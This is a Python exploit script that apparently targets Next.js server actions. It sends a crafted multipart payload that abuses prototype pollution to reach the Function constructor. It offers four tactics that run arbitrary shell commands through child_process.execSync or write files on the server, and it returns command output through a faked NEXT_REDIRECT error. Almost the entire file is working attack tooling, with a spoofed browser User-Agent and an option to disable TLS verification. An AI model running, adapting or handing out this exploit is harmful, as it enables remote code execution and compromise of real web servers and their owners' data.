#!/usr/bin/env python3
"""
Exploits prototype pollution to achieve remote code execution on the server
"""

import requests
import json
import argparse


requests.packages.urllib3.disable_warnings()


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('target')
    parser.add_argument(
        '--tactic', choices=['blind', 'header', 'redirect', 'file'],
        default='redirect'
    )
    parser.add_argument('--command', '-c', nargs='?', default='id')
    parser.add_argument('--proxy')
    parser.add_argument('--no-verify', action='store_true')
    parser.add_argument('--timeout', '-t', type=int, default=25)
    parser.add_argument('-v', '--verbose', action='store_true')
    parser.add_argument('--filename', '-f', nargs='?', default='/tmp/pwned')

    return parser.parse_args()


def prepare_payload(args):
    try:
        match args.tactic:
            case 'blind':
                payload = f"process.mainModule.require('child_process').execSync('{args.command}');",  # noqa
            case 'header':
                payload = f"var res=process.mainModule.require('child_process').execSync('{args.command}').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{{digest: 'NEXT_REDIRECT;push;/login?a=`${{res}}`;307;'}});"  # noqa
            case 'redirect':
                payload = f"var res = process.mainModule.require('child_process').execSync('{args.command}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",  # noqa
            case 'file':
                payload = f"process.mainModule.require('fs').writeFileSync('{args.filename}', 'VULNERABLE');",  # noqa

        crafted_chunk = {
            "then": "$1:__proto__:then",
            "status": "resolved_model",
            "reason": -1,
            "value": '{"then": "$B0"}',
            "_response": {
                "_prefix": payload,
                "_formData": {
                    "get": "$1:constructor:constructor",
                },
            },
        }

        files = {
            "0": (None, json.dumps(crafted_chunk)),
            "1": (None, '"$@0"'),
        }

    except Exception as e:
        print(f"[!] Unable to prepare payloads: {e}")
        exit(1)

    return files


def main():
    args = parse_args()

    print('=' * 60)
    print('RCE Exploit')
    print('=' * 60)
    print(f'Target: {args.target}')
    print()

    session = requests.Session()

    proxies = {}
    if args.proxy:
        proxies = {'http': args.proxy, 'https': args.proxy}
        print(f'[*] Using proxy: {args.proxy}')

    session.proxies.update(proxies)
    session.verify = not args.no_verify

    if args.tactic == 'file':
        print(f"[*] File to create: {args.filename}")
    else:
        print(f"[*] Command to execute: {args.command}")

    files = prepare_payload(args)

    headers = {
        "Next-Action": "x",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"  # noqa
    }

    print('\n[*] Sending payload...')
    try:
        res = session.post(
            args.target,
            files=files,
            headers=headers,
            timeout=args.timeout
        )
        print(f'\n[*] Status: {res.status_code}')
        print('[*] Response:\n')
        print(res.text)
    except KeyboardInterrupt:
        print('\n[!] Interrupted')
    except requests.exceptions.RequestException:
        print(
            '[!] Timeout reached. '
            'Increase timeout, try another tactic '
            'or check result if it was blind/file tactic'
        )
    except Exception as e:
        print(f'[!] Error: {e}')


if __name__ == "__main__":
    main()
